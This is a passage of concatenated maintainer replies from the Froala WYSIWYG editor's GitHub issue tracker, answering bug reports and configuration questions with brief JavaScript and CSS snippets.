thing.\n. The onclick property is being removed because it is not in the htmlAllowedAttrs option. The best way would be to have the JS outside of the editor (in a <script>) and not allow users to type JS inside the editor. \n. You should change the linkInsertButtons option.\n. I have just checked this and it appears to work fine with the master version. Could you confirm you're using the master version?\n. OK. Thank you.\n. Are you using the master version? Could you please send us the HTML you are using?\n\nOn 10 Dec 2015, at 13:17, Sascha Brendel notifications@github.com wrote:\nHello again.\nWhen i'm switching to the code view on firefox my content gets deleted sometimes.\nMaybe it's depends from the window size.\nWhat is happening?\nHere is a screencast of the problem.\n\u2015\nReply to this email directly or view it on GitHub.\n. Yes, this was a problem that was happening sometimes in V2.0.0, but it was fixed.\n. This looks like you're using V1. Because of the way V1 was designed it's not possible to fix it, however that works without problems in V2. Please upgrade to V2 where the problem is fixed.\n. Focus: https://www.froala.com/wysiwyg-editor/docs/methods#events.focus.\nMissing from docs, but you can use commands.selectAll as a method to select everything.\n. @ConnorsFan we're going to check.. Just added it few days ago https://github.com/froala/wysiwyg-editor/commit/c63c243c3c29a4a3af34e65a19733f7552ccc752.\n. Should be fixed on master. Could you check?\n. We support FontAwesome by default, but you can customize what you use: https://www.froala.com/wysiwyg-editor/docs/concepts/custom-icon.\n. @riccardomessineo 0871736e5ec141019c79741ad1fe0905befa63c2 fixes it.\n. You could add the class to the buttons after initializing the editor like this:\n\njs\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  var buttons = ['bold', 'italic', 'underline'];\n  for (var i = 0; i < buttons.length; i++) {\n    editor.$tb.find('[data-cmd=\"' + buttons[i] + '\"]').addClass('custom-button');\n  }\n}).froalaEditor();\n. Are you using the master version?\n. Please try with master. We fixed a similar issue few days ago.\n. Please make a jsFiddle for it.\n. Yes, if inline mode is used and you initialize the editor on another tag than DIV then the ENTER_BR is automatically turned on.\nLE: The reason for this is that inside tags such as h1, h2, p, etc. you cannot have another P tag because it would break the HTML. @timovanderzanden Would it work for your if you use DIV instead of DATA?\n. Agreed that the editor should not change the enter behaviour.\n. Hi @largeden! Last commit should fix it. Could you please check? Thanks.\n. @euangoddard I have just tried this on Chrome 47 & OSX and I cannot reproduce it. Could you check with the master version?\n. Could you check this with version 2.0.5 (master)? Also, are you including any CSS style from remote locations over HTTPS?\n. Are you checking it using html.get or by toggling to code view?\n. In code-view and inspect element, the editor will use classes, but when you retrieve the HTML, it will convert them.\n. Could you make a jsFiddle to reproduce it?\n. Most probably it will be hard if not impossible to make a jsFiddle with this option disabled. It might be easier if you could send me a link to a page where to check it. You can use the email from my profil if you don't want to make it public.\n. There was a problem in 2.0.4 in few commits with the buttons not showing, but now it's fixed. We'll check the zip shortly.\n. It's not working because you're include the CSS from CDN. You should include it from a location which is not remote. The CSS should be on the same server where you're page is and include it via absolute/relative path. It's a browser limitation which does not allow to read CSS properties from remote CSS styles.\nIt's best to use the V2.0.5 that we have released today. https://www.froala.com/wysiwyg-editor/changelog\n. @Suhas010 if you are using useClasses: true, then the editor uses classes for image alignment and other features. You can for sure include CSS from CDN and you can change the image alignment.. @markedmondson that is correct. Thanks for pointing this out.. You should set the parent CSS overflow: visible.\n. Most probably you have the element you're initializing the editor in a FORM tag. There are 2 possible workarounds:\n1) Enable the iframe option.\n2) Make sure the element you're initializing the editor on has no form tag as parent.\n. We won't mix the editor with Bootstrap because not everyone is using it. However, you could use the video.inserted event to do that.\n. The video.inserted event contains the video object. You should just set it's width. Unfortunately, we don't have a sample for it.\n. At a closer check it appears that jQuery is changing it. We'll fix it shortly.\n. Closing this, because in ember we can do it differently and it's not necessary to change the event names in the editor itself.\n. See https://github.com/froala/wysiwyg-editor/issues/399#issuecomment-70536920. I believe it's a confusion.\n. The URLS plugin is automatically converting links to A tags. If you don't want such behaviour then you should simply not include it.\nBy default the editor is wrapping the content into paragraphs. If you don't want to have them wrapped, then you should change the enter option. \n. When you're rendering the HTML, it is being displayed as string instead of HTML. You should mark is as safe to use so that is is displayed as HTML and not text.\n. It depends on the Framework/Programming language you're using on server side. For example, in RoR you have html_safe helper for that.\n. In PHP it should display the HTML without problems, probably you're escaping it somehow. \nWe use this repo for bug tracking and not for support. We offer tech support under the Advanced/OEM license, therefore if you have such a license please contact us via our website.\n. There is a problem with your config.\nWe use this repo for bug tracking and not for support. We offer tech support under the Advanced/OEM license, therefore if you have such a license please contact us via our website.\n. @gblachonupg you should use a CORS config like this one: https://gist.githubusercontent.com/stefanneculai/deed108fad534d0db3ff/raw/a8829d697dcd7f90b934be61862c94cb97e69d50/CORS%2520file\n. The editor is using FontAwesome by default for icons and that's why buttons disappear. However, if you want you can use images instead: https://www.froala.com/wysiwyg-editor/docs/concepts/custom-icon.\n. I understand that, however it is not possible what you're asking for. By default, the editor uses Font Awesome for displaying icons, which basically is a font. Disabling fonts, would also disable the editor buttons because they are using the font option.\nIf one of your website requirements is to have it work with fonts disabled, then you can customize the editor buttons and use images instead because it is the only way you could get it work correctly for your use case. Details about that are available in our docs, but here is what you mainly should do:\n``` js\n Include the editor JS and CSS \n\n  // Change the default icon template.\n  $.FroalaEditor.ICON_DEFAULT_TEMPLATE = 'image';</p>\n<p>// Define the icons for the editor buttons. \n  // For each icon you use in the toolbar, you should specify what image to use.\n  $.FroalaEditor.DefineIcon('bold', {\n    SRC: '/path/to/bold.png',\n    ALT: 'Bold'\n  });</p>\n<p>$.FroalaEditor.DefineIcon('bold', {\n    SRC: '/path/to/italic.png',\n    ALT: 'Italic'\n  });\n\n``\n. The editor doesn't come with any such feature builtin. If you want to check that the editor is not empty, then you should use thehtml.getmethod and then display if the error message.\n. If you could make a jsFiddle which shows the editor problem, then we can definitely reopen this and look at the problem.\n. The editor is displaying the original image as it was taken. For the moment we don't have any tools for doing changes over the original image.\n. If you have a cell on a row which doesn't have multiple lines then that's why you don't see any change.\n. Could you make the SS again?\n. Are you experiencing this on [our website](https://www.froala.com/wysiwyg-editor) as well?\n. Please contact us via [our website](https://www.froala.com/wysiwyg-editor/contact) for tech support included in the OEM license. Also, please make sure you're using the latest version.\n. You should change the$.FroalaEditor.VIDEO_PROVIDERSobject and add Wistia.\n. You should use'form-nonce'`.\n. This is by design. For the moment we don't support multiple images/files upload.\n. @hackel we do not keep Feature requests here that's why this is closed. It is on our list, but I cannot tell you when it will be implemented. Although it might appear an easy thing to achieve, there are multiple things to consider. \n    - In order to have the images inserted correctly into the editor, the user should not type anything while the images are being uploaded. You can see that now when an image is uploaded we disable the editor input. This might result in having the user wait a long time for the images to be uploaded if there are several images there.\n    - Another thing to be aware of is how images are being inserted. The editor inserts images at the cursor position so there is no problem with the first image. But after the first image is inserted you have to decide where the next one should fall.\n. @hackel Thank you for the feedback, really appreciate it a lot. I can assure you we're working on this feature, but we won't add it until we find a good way to address the things listed above plus few others. Adding new features is easy, but adding features that users love to use takes a bit of time and research. \n. @mukk85 unfortunately, we don't have an ETA for this. Thank you.\n. Would it be possible to make a JSFiddle? What OS and browser are you using? \nThanks.\n. Please contact us via our website.\n. That is the correct behaviour.\n. Actually it is an issue and that happens only as you type.\n. Please open this on the Angular repo.\n. Last commit fixes this. You might notice that some formatting such as bold/italic might not appear. That is because Google Docs uses the style attribute to set them and by default the editor is stripping the style attribute on paste. However, you can change that through the pasteDeniedAttrs option.\n. @ibtisamniche-vteams are you pasting from Google Docs?. Could you please provide the exact steps to reproduce it? Thank you.\n. @DallanQ Could you please explain the exact steps to reproduce this issue?\n. We have rechecked this and on destroy the tooltip is set to be removed from the DOM. Please make sure you're using the latest version.\n. I have just tried it and it appears to be fixed on the master version. Could you please try it?\n. Last commit fixes it. The customizer will be updated just only when we'll make the release 2.0.6, in the following days.\n. Could you please provide more details?\n. That's because, you're not including the Code Beautifier plugin.\n. It's fixed now.\n. Is that happening with 2.0.5 as well?\n. OK. We'll check it.\n. I have just tested it with the master version and it works fine. Here is how I included it:\n``` js\nvar $ = require('jquery');\nrequire('froala-editor/js/froala_editor.min.js')($);\nrequire('froala-editor/js/plugins/link.min.js')($);\n$(function() {\n  var $target = $('').appendTo('body');\n  $target.froalaEditor()\n});\n``\n. We have stopped support for V1 and we're no longer maintaining it.\n. That's because you're removing the element from the DOM and the image would never finish to load. You could either use theimage.loadedevent instead, or wrap the image DOM object without replacing it.\n. If you want to achieve that, then you'd have to modify the video plugin for that. Unfortunately, it is not possible to have a generic resizer because video DOM structure is different than image DOM structure and that would happen in the most cases. The best way to do that is to use the unminified JS (which comes with the Advanced/OEM license) and change it for your needs.\n. I can confirm it, however that appears to happen only when the cursor is just before the nested list.\n. Actually, the expected output is: `\nLast commit fixes it.\n. :+1: \n. This was added in development only so far and that's why it is not updated on our website yet.\n. Thanks for the PR. We don't merge changes here directly, but last commit is adding the changes you suggested. :+1: \n. @Alex777UAE thanks for the feedback. We'll do the necessary updates.\n. That package was not created by us. We have emailed the author and asked him to unregister it. \n. We use this repo for bug tracking only and we do not accept feature requests here. I put it on our feature list and if there will be further request for it, then we'll implement it. Thank you.\n. We do not guarantee that feature requests will be implemented. It is on our list but has a very low priority and probably won't be implemented very soon.\n. Setting imageDefaultWidth to 0 will not add any width to the image. We have just checked and it is no problem from the editor. \n. The best way is to do that with CSS:\nCSS\n.fr-view img {\n  width: auto;\n}\n. You should use the class fr-inner. See: https://github.com/froala/wysiwyg-editor/blob/master/html/boostrap/content.html#L49.\n. See https://www.froala.com/wysiwyg-editor/docs/options#linkAutoPrefix.\n. With what options are you initializing the editor? Also, are you using the master version?\n. Because of some mobile limitations, on iOS this feature is not available.\n. Most probably one of the parents has the CSS property overflow: hidden. In Firefox and Safari, the CSS position: sticky doesn't work correctly in such cases. It's a browser issue.\n. @viion on the page you sent us the link the toolbar should stay at the top of the editor as it does.\n. The toolbar is sticky at the top by default (toolbarSticky: true). If you disable the option, then the toolbar  will not stay sticky at the top, but scroll along with the content. That is explained on the page as well:\n\nIn this example, when you scroll down, the rich text editor's toolbar will scroll along with the page and it will no longer be visible at the top of the page.\n. @sahotataran We just tried this and cannot reproduce it, everything appears to work just fine on a pristine editor instance. Are you able to reproduce it on our website?\n. What do you mean by click on the blank toolbar buttons?\n. Thanks. We'll check it.\n. Thanks for all the details. We'll try to fix it during this week.\n. @largeden could you please check with the latest commit if it is fixed? It looks good to me now, but it's always better to get it double checked for Korean/Japanese issues.\n. @largeden Thanks. :+1: \n. Could you please provide the steps to replicate the issue? Thanks.\n. We have just checked and changing saveMethod to PATCH works correctly. Most probably there is something else not related to the editor.\n\n\n. We already have that. Isn't this what you're looking for?\n\n. We're currently working on such a feature. :-)\n. That is the desired behaviour. Without that DIV it wouldn't be possible to edit content when the editor is empty. \nAlso, the toolbar was designed to appear at the top instead of floating next to the text on mobile devices.\n. If you're looking to prevent multiple lines, then there is an option for that: https://www.froala.com/wysiwyg-editor/docs/options#multiLine.\n. @gmacherey thanks for the suggestion. I added it to our feature-list.. It was fixed yesterday on Github.\n. For such cases, there is the line breaker tool: https://www.froala.com/wysiwyg-editor/docs/examples/line-breaker\n. The buttons from the quick insert plugin are different than the ones from the toolbar. They are designed to make quick actions and they have a totally different behaviour than the ones which are available in the toolbar. The current available list for quick insert is: ['image', 'table', 'ul', 'ol', 'hr', 'paragraph'].\n. We'll add some docs on our website for it shortly.\n. Unfortunately, it's not possible yet and I don't have an ETA to share with you guys.\n. @bencallis1 not yet. Sorry to keep you guys waiting so long.. @Zetal911 @nicooprat @bencallis1 @clechner77 @ianflorentino @raerae13 @msisto @mpatelj @prakash-chokalingam Here is the official way of doing this starting with version 2.7.0: https://www.froala.com/wysiwyg-editor/examples/custom-quick-insert-button.. Unfortunately, we cannot replicate it. Please make a jsFiddle.\n. You're not including the save plugin most probably.\n. It's for sure a bad plugin inclusion. We offer tech support as part of the Advanced/OEM licenses. If you have one, please contact us via our website. Thank you.\n. Could you please let us know the steps to reproduce the issue? \n. Is it reproducible on the master version? By default the image is inserted as block and it doesn't break any content. See https://www.froala.com/wysiwyg-editor/docs/options#imageDefaultDisplay. If you want it to be inserted inline, then you should change the default option.\n. Please make a jsFiddle for it.\n. Closing this due to lack of response. We'll reopen it if there are enough details.\n. Have you disabled the useClasses option?\n. To get them work correctly, you should put the small, medium, large classes in a selector like this:\n``` css\n.fr-view img.small {\n}\n.fr-view img.medium {\n}\n.fr-view img.large {\n}\n```\n. html.set expects a string as parameter, not null. It's not an issue.\n. Could you please send us the Word document you're copying from? Thanks.\n. We just checked it and works fine on the master version. Probably, this issue was resolved sometime after the V2.1.0 release.\n. Sure: https://www.froala.com/wysiwyg-editor/docs/examples/at-js\n. We cannot reproduce it. Could you please make a recording and check you're using the master version?\nAre you using the iframe option?\n. I am closing this because we cannot reproduce it. We'll reopen it if we get enough details.\n. Most probably the script you're trying to add is using acron which is not defined. It's not an editor issue.\n. Could you send us such an example to test it? Also, please make sure you're using the Github master.\n. I just tried it with the master version and I cannot reproduce it. If you could make a jsFiddle for it, then we can look over it.\n. I managed to replicate it locally with useClasses: true option, therefore I'm reopening this.\n. It's already fixed on Github master.\n. When using iframe: true you should load all the CSS files from the same domain where the editor is. That's why the borders won't appear on jsFiddle.\n. Sure: https://jsfiddle.net/82uvp9kf/1/. It should load the CSS from the same domain and the only way to do that on jsFiddle is to paste it in the CSS panel. Getting the HTML does not keep the blue border for me, is it for you?\n. Sorry, probably I forgot to hit Update: https://jsfiddle.net/f87p3s65/. Anyway, if you are tying to reproduce it for #1068 it's no longer necessary because we reproduced that problem.\n. I don't understand exactly what should I do to see the issue. Could you please let me know the steps to replicate the problem and explain which exactly is the problem? Thanks.\n. The editor is designed to join sibling lists that have the same attributes. If you want a different behaviour then you should modify the JS of the editor directly.\n. You could change that in the froala_style CSS file: https://www.froala.com/wysiwyg-editor/examples/table-styles.\n. @royshoa @trstaley @olivierognn if you need custom table styles please follow the approach described here: https://www.froala.com/wysiwyg-editor/examples/table-styles.. If you'd like to use a table without any borders, you could define a class for it. E.g.: https://jsfiddle.net/froala/r38jwxbn/408/\n\n. You should also update the CSS for the editor, not only the JS files. :smile: \n. If the HTML you want to insert contains block elements ('p', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'pre', 'blockquote', 'ul', 'ol', 'li', 'table', 'td', 'th', 'thead', 'tfoot', 'tbody', 'tr', 'hr', 'dl', 'dt', 'dd', 'form') then the editor will split the current tag. Instead you could use a span as a replacement for div.\n. Unfortunately, that is not possible.\n. Are you using the option https://www.froala.com/wysiwyg-editor/docs/options#pluginsEnabled?\n. Could you make a jsFiddle?\n. 1) In the image.beforeUpload event you should convert image to base64 and insert it if you want so. However, we do not recommend this because browser performance might drop a lot when using base64 images.\n2) The same event can be used for that.\nWe use this repo for bug tracking, not for support, therefore if you have questions or need help integrating the editor please contact us instead of opening an issue.\n. Could you please provide few more details? Thank you.\n. @swapnil002 I am closing this due to lack of response. If you can provide more details for us to reproduce it then we will reopen it. Thank you.\n. When is that happening? Thank you.\n. Are you experiencing this on our website? What should we do after going to the fullscreen mode?\n. @farrrr could you please let me know if you experience this on our website as well? Thank you.\n. I am closing this due to lack of response.\n. It's already fixed on the Github master. Will be included in the next release.\n. You should use the Github master JS and CSS.\n. Actually this is not an editor issue, but it is highly related to the way of how Twitter Card is being embedded. The A tag is replaced with an IFRAME which has the content loaded through JS, it doesn't have any src set. Because of that when the line is split, the iframe content will go missing and you'll not see it anymore. Same thing will happen if you'll try to get the HTML inside the editor.\nBasically the iframe has to be moved inside the DOM and that will make it reload and without a SRC attribute it will result in a blank one.\n. We don't accept feature requests here, but I put it on our TODO list. Thank you.\n. Most probably it is in conflict with something else from your app. We use this repo for bug tracking, not for tech support. If you have a license which includes support (Advanced or OEM) please contact us via our website. Thank you.\n. It's a plugin called quick_insert. Just don't include it if you don't want to use it. :smile: \n. This problem is fixed on master and it doesn't disappear anymore.\n. The file/video plugins are designed to use the buttons inside the toolbar. If you want to place them in other containers, then you should modify them accordingly.\n. Those events are being triggered only when the commands are being called (e.g. button click, shortcut), not when calling methods directly.\n. No, the editor is not designed to support XTHML, but only HTML5.\n. Thanks for the feedback, really appreciate it. However, it's not only that, but the editor output is not designed to be XHTML compatible. E.g.: the editor will output <br>, not <br/>. We have had request for XHTML before and if we're going to add it, then we'll make this change as well.\nAnyway, if you want to use entity code instead, you could do that very handy by changing the entities option.\n. You should initialize it like below. In JS when you use dash for properties they have to be wrapped with quotes.\njs\n$('.selector').froalaEditor({\n  imageStyles: {\n    'class-2': 'Class 2'\n  }\n});\n. No. We implement it based on how many requests are there for a feature and how important we consider it being. For the moment we have other features with higher priority.\n. After a further check we decided that won't add this for two main reasons:\n1. The editor is positioning toolbars based on the scrollableContainer option. This means that inside the scrollableContainer everything should be visible.\n2. Having the popups appended to body instead of the toolbar wouldn't permit a smooth scrolling experience.\n. Have you set the height using the editor option?\nPS: please follow the issue template when reporting one.\n. We cannot reproduce it on https://www.froala.com/wysiwyg-editor/docs/examples/predefined-height which uses the height option as it should. I believe you're doing something wrong. I am closing this for now. If you could make a jsFiddle to reflect the problem then we could definitely look over it.\n. Unfortunately, we don't have any, only a jsFiddle: https://jsfiddle.net/froala/q79n2udx/\n. @javeriaanwer could you please make a recording to highlight the issue?. If you want to store images as base64, then you could use the image.beforeUploade event to prevent the default behaviour and insert image as base64. However, we do not recommend that because browsers tend to drop performance when using base64 images inside contenteditable.\n. enter: $.FroalaEditor.DIV should be enter: $.FroalaEditor.ENTER_DIV.\n. Has been fixed few hours ago.\n. We fixed this and then release V2.2.1. The unminified JS is available for the latest version official released (currently 2.2.1).\n. It is included in V2.2.1 which we released today: https://www.froala.com/wysiwyg-editor/changelog.\n. Already fixed by 54af264b8cba0070116c1940c98e8e0c44fe1192\n. Corrected. :+1: \n. In CSS, there is the following rule .fr-view img {max-width: calc(100% - 10px);}. This prevents image to go larger than the editor width. Because you have a wrapper DIV, this rule would compute from the width of the DIV. The editor behaviour is correct. You could either change this rule to max-width: 100% or remove that wrapper DIV.\n. https://github.com/froala/wysiwyg-editor/blob/master/html/boostrap/modal.html#L43 should be used to fix fullscreen inside Bootstrap modal. For more explanation, see: https://github.com/twbs/bootstrap/issues/15856.\n. Inside textareas, entities should be escaped again: https://jsfiddle.net/rw85vbd8/.\n. Even though, it is necessary to escape them before putting in a textarea. You can read more about that here: https://github.com/froala/wysiwyg-editor/issues/482#issuecomment-83714915\n. Can you replicate this on our website?\n. We use this repo for bug tracking only. If you have questions or need help integrating the editor please contact us instead of opening an issue.\n. I just tried to reproduce this, but I couldn't. @open2 is this happening our website as well?\n. You're using an older version 2.0.4. Please upgrade to the latest one 2.2.1.\n. @open2 unfortunately, we could not reproduce it. \n@largeden could you please take a look over it and let us know if you can reproduce it?\n. Yes. Are you able to reproduce it on our website? Could you make a recording for it?\n. Could you let me know the options you're initializing the editor with? \nPS: There is not video attached.\n. I cannot download it from there. Could you please upload it somewhere with public access? \nAlso, I would need only the options you're initializing with not the entire files. Thank you.\n. None of the editor options you're using should affect typing. I cannot download the file from the link you sent - I get an alert message in Korean I assume.\nIf the issue is not replicable on our website, then probably there is some other JS on your page which breaks typing.\n. Currently, there is no option for that. We'll have to discuss to see if it actually makes sense to allow that or not.\n. > DOCTYPE Declaration is mandatory for most current markup languages and without one it is impossible to reliably validate a document. (W3C Doctype Declaration)\nWhen using the fullPage option, the editor is designed to edit an entire page. Also, the editor output is designed to be HTML valid so it doesn't make sense not to have DOCTYPE. Anyway, you could remove it using a RegEx in the HTML. Here is a JS one: <!DOCTYPE ?([^ ]*) ?([^ ]*) ?\"?([^\"]*)\"? ?\"?([^\"]*)\"?>/i.\n. Nice catch. :+1: \n. Probably you have some CSS which is in conflict with the editor. Are you able to reproduce this on our website?\n. We've just checked these 2 cases you reported. We don't consider them being an issue. The editor converts the space character to NBSP so that users can see changes when they actually edit something. We designed the editor to convert blank spaces when you initialize the editor, the same way it would work when you put a space in the editor. For example in the first case, if you have an image and press space after it, the editor will add a NBSP.\n. @aridlehoover indeed, it appears there is a problem. We'll fix it shortly.. You should use the fullPage option if you want that.\n. No, that is the correct behaviour. You could add title to the htmlRemoveTags if you want it to be removed.\n. 81e6a5686fb1caf588557f63bec3375a850f4511 is introducing back the toolbar inline next to the selection and fixes this issue as well. We had high request for this feature and many users were missing it after it was removed back in V2.0.0.\n. Unfortunately we cannot do more than that. The issue with backspace is fixed, but can't do anything more because it appears that this the way IE IME is working when there is an image with display: block.\n. We decided not to replace selected text anymore with the image, but collapse selection to start and insert image there.\n. This is not an editor issue, but a problem of how you're implementing it. For tech support, please contact us via our website if you own a license which includes support (Advanced/OEM).\nThank you.\n. No, it doesn't say anything about that, but that doesn't mean the images cannot be resend. It's a matter of how you're implementing it.\nPlease see below how we define a bug (https://www.froala.com/wysiwyg-editor/terms). In this case it is not considered a bug by us. Thanks for understanding.\n\nBug shall mean a behavior in the Software's functionality that we do not consider intended; \n. Thanks for the feedback.\n. Are you experiencing that on our website?\n. None of the editor options should get in conflict with that.\n. If you have a license that includes tech support (Advanced/OEM), please contact us via our website and we can definitely help you further.\n. It's not an issue. Inserting an iframe without a HTTP protocol tries to load the page from the current page which obviously won't work. \n. Here are further details. Adding an iframe the way you want in a HTML page won't work. You can see that in the following the jsFiddle which doesn't use the editor: https://jsfiddle.net/froala/7usff17c/.\n\nWe have no reason why to close something that is an issue instead of fixing it and would appreciate a lot if you can collaborate with us. Thank you.\n. Is that reproducible on our website?\n. Most probably you're using an older version. Please use the latest one 2.2.1.\n. On which page can you reproduce it?\n. Could you please clear your browser cache? We just tested it on IE11/Windows 8.1 and IE10/Windows 7 and couldn't replicate this.\n. @raerae13 I just checked on Windows 7, IE 11 and I can confirm the issue. It appears that it is important to have exact this combination.\n. Just tested this with a Virtual Machine from Microsoft Developer and appears to work fine. I believe it is an isolated case with a very specific configuration.\n. Last commit adds in the imageOutputWidth option which will output the width as attribute when enabled. By default it is disabled.\n. imageOutputWidth was replaced by imageOutputSize. https://www.froala.com/wysiwyg-editor/docs/options#imageOutputSize\n. You could use the Line Breaker plugin https://www.froala.com/wysiwyg-editor/docs/examples/line-breaker and change the lineBreakerTags option to include quote as well.\n. We're always looking forward to improve the editing experience, but that's all we can do in this direction for now. What we'd recommend instead is to make a custom button that would appear when you go with mouse over your non-editable content and remove it.\n. Unfortunately, this is a wontfix for now because there is a WebKit issue and we can't do anything about it. It appears that Chrome has fixed it lately and it will be included in a release shortly (https://bugs.chromium.org/p/chromium/issues/detail?id=574363&q=label%3ACr-blink-layout&colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Cr%20Status%20Owner%20Summary%20OS%20Modified).\n. We won't add such a feature, but you could use the image.uploaded event to parse the response and then insert the image in the editor with image.insert method.\n. We offer tech support via email under the Advanced/OEM license. If you have one, please contact us via our website. Thank you.\n. See https://github.com/froala/wysiwyg-editor/tree/master/html/require_js for RequireJS. Using it with CommonJS is similar.\n. Many developers use it currently so it's not a good thing to change it right now. Maybe when we'll release a new major version.\n. We created separate plugins so that everyone can include only what he needs. It doesn't make sense to include the video plugin if you never use that feature. We won't change that, because that's the whole idea of having plugins.\n. Thanks for your feedback, Alvaro. I really appreciate it.\n. Definitely, you can find on our website a complete list of events and methods available in the editor:\nhttps://www.froala.com/wysiwyg-editor/docs/methods\nhttps://www.froala.com/wysiwyg-editor/docs/events\n. @Artenes for Math component, there are the guys from Wiris which made an integration http://www.wiris.com/plugins/demo/froala/php/. If you have any specific questions about achieving something, please don't hesitate to reach us via our website.. @Artenes Our support team can definitely offer more guidance. Please use the contact form from our website to provide more details: https://www.froala.com/wysiwyg-editor/contact. Thank you.. That's because you're initializing the editor on a div which has contenteditable=\"true\". Removing contenteditable=\"true\" will work just fine.\n. @aronsimo we're going to add a button to the editor upload window for that - it's on our list :). Last commit adds imageMinWidth option that prevents image going smaller than that size.\n. That's most likely because you have parent DOM elements which have CSS property overflow: hidden. Make sure you don't have any such rule set.\n. Yes, it is necessary to call editor.selection.save to have the markers there. html.get(true) would return the markers only if they are there - maybe we should clarify that in docs. Anyway, it doesn't remove any BR. Please see the attached screenshot.\n\n. You should use the refresh callback of the buttons. For tech support please contact us via our website froala.com/wysiwyg-editor/contact. Thank you.\n. Please make a jsFiddle for it.\n. I am closing this due to lack of information to reproduce it.\n. There is no built-in way of doing that.\n. Could you send a screenshot?\n. That is the correct behaviour. The popup will appear above only when the image is too close to the bottom of the page, not screen.\n. You'd have to make some changes in the editor core. If you want to do that, we can explain you what should be changed, under the tech support we offer with the Advanced/OEM license. If you have such a license please contact us via our website. Thank you.\n. A button can be disabled by adding the class fr-hidden. The button can be searched by using data-cmd attribute. We use this repo for bug tracking. For tech support, please contact us via our website.\n. It's fixed on master.\n. It's up to you to implement it if you want such a thing. When we designed V2, we used those Material Design parts that we consider useful. You can read more about our vision regarding Material Design on our blog post: https://www.froala.com/blog/material-design-another-face-of-flat-design.\n. You can get the buttons from the toolbar using the following selector: editor.$tb.find('[data-cmd=\"command_name\"]').\n. codeView.toggle works fine. When the switch is made to the code-view, all the buttons from the toolbar are disabled, except those buttons which have the data-cmd=\"html\" attribute.\n. Nice catch :+1: \n. We added the Table word a bit later to clarify the button actions and probably we missed to update the translations. A PR on this would be highly appreciated.\n. See https://www.froala.com/wysiwyg-editor/docs/examples/custom-toolbar.\n. No, isURL method works correctly just as it is because it is designed to check for absolute path URLS. For example www.google.com is not a valid URL because without protocol it is interpreted as a relative URL.\n. @AhHa45 I believe this is what you're looking for: https://wysiwyg-editor.froala.help/hc/en-us/articles/115000555949-Can-I-insert-images-as-base64-.. @AhHa45 the popups should be hidden by calling the editor.popups.hideAll method in the callback. https://wysiwyg-editor.froala.help/hc/en-us/articles/115000555949. That is happening because having the editor hidden, in FF it's not possible to compute it's size. Unfortunately, this is an issue from the browser that we can't do nothing about. To fix your problem, you should call the size.refresh method after the modal is shown.\n. Sorry, it should be: $('#froala').froalaEditor('size.syncIframe');.\n. I have just tried and couldn't replicate it. Have you done anything else before? \n. @mgodwin thanks for the details!\n. Have you downloaded the Github master?\n. Is that happening on our website?\n. Does imageOutputWidth fixes your problem?\n. Are you able to reproduce it on our website? \n. It's hard to track it down without having the possibility to replicate it. Anyway, could you try the latest commit and let me know if it fixes the problem?\n. @rblin081 Thanks for the jsFiddle. Last commit fixes it. \n. Please send us the document you're copying from. \n. @benjaminknox the doc you sent has only a line with a single word.\n. @benjaminknox I am not able to reproduce it with the master version. Could you please make a recording?\n. I am closing this due to lack of response.\n. fr-tag from V1 is no longer used in V2. The editor is using classes to style the content inside id (images, videos). If you don't want these to be included in the output, then you can use the useClasses option.\n. While I appreciate your feedback, we won't remove those classes which are being used to align and change image display. If you don't want to have the image styles being changed, not including the imageAlign and imageDisplay buttons won't use classes for images anymore.\nThe toolbarInline option refers only to the main toolbar, not the image/link/videos etc.\n. @cearny that makes sense. It wasn't totally clear from your initial description.\n. Last commit removes z-index: 3; overflow: auto;. \nposition: relative; is necessary for displaying the image correctly.\ncursor: pointer; is a wontfix. It is being used for displaying the hand when going over the image to show interaction, but it's not possible to remove it from the inline output. Maybe in the future we'll add an option to reject certain styles from the output when using useClasses.\n. The release will be made today. \nThat's how we designed it initially, but after-while we decided that current way is cleaner. \n. The borders are being added from froala_style CSS file. That is style which should appear both inside and outside the editor. That behaviour is correct.\n. @berzniz If you want not to have those I would recommend to you use a RegEx maybe to remote that for images.\n. You're not including the image plugin.\n. I am missing something or there is no issue. Would it be possible to make a recording? Thanks.\n. Well.. I've tried it for about 5 minutes without luck. I'll wait for the video when you can.\n. @rblin081 What browser and os?\n. Could you make a jsFiddle for it and explain the steps to reproduce it? I couldn't replicate it on a blank editor instance.\n. This appears to be a completely other thing. Could you please fill a new issue for it?\n\nOn 22 Apr 2016, at 18:46, rblin081 notifications@github.com wrote:\nYa sorry the browser is IE 11\nhttps://jsfiddle.net/f87p3s65/113/\nPress Bold button\nType some text\nPress Bold button again to disable\nWithout putting in a space type some text\nWill still be bold and bold option has been re-enabled\nOn Fri, Apr 22, 2016 at 11:44 AM, Stefan Neculai notifications@github.com\nwrote:\n\nCould you make a jsFiddle for it and explain the steps to reproduce it?

That's because you put the strong tag into htmlDoNotWrapTags.\n. Fixed by 2c1c3560f36b69ec21cf1e9f076d69c589a1a1f5.\n. Same thing happens when you edit directly on a contenteditable element without using the editor (https://jsfiddle.net/froala/d29LcLb1/2/). Unfortunately, this is a Chrome caret display issue and we couldn't find any fix to it. \n. That behaviour isn't consistent by default in all browsers and that's why we disabled it. Currently, we're working on a feature which would disable/enable such a behaviour. \n. This is caused by that empty <span style=\"color: rgb(147, 101, 184);\"></span> and is a result of adding SPAN to htmlAllowedEmptyTags. As I explained on another issue, spans are sensitive tags in contenteditable and they might break things so it's always good to limit their usage. \n\n\nAlso, having that <span style=\"color: rgb(147, 101, 184);\"></span> is pretty useless because the browser will never put the cursor inside it and that's one of the reasons why the editor is removing empty spans by default.\n. It works just find if you pass the DOM node, instead of the jQuery object: $('some-node').get(0). Our long term plan is to remove the jQuery dependency. \ud83d\ude04 \n. You should get it work just the way you want by setting the following option: enter: $.FroalaEditor.ENTER_BR.\n. Could you confirm this is happening only when you have image inside a blank paragraph? I mean something like this <p><img></p>.\n. Issues marked with bug tag are the ones which are fixed first. Yes, it might be fixed in the following days.\n. Could you confirm that this is happening only when the editor is blank (no content inside it)? Thank you.\n. https://github.com/froala/wysiwyg-editor/issues/1188\n. Improved as part of https://github.com/froala/wysiwyg-editor/issues/1188.\n. It's fixed on master: 2.2.4 development. https://jsfiddle.net/r3oeopkc/2/\n. Actually that is the correct behaviour. The incorrect behaviour was to keep spaces at the beginning of the line.\n. P is a block tag. Not adding a BR in it will make impossible to type inside. If you want to prevent that you can change the behaviour of the fillEmptyBlocks method.\n. Font size changes the font size of the text where the cursor is, while paragraph format is changing the type of the paragraph. The current behaviour is the correct one.\n. That's because you are adding span to 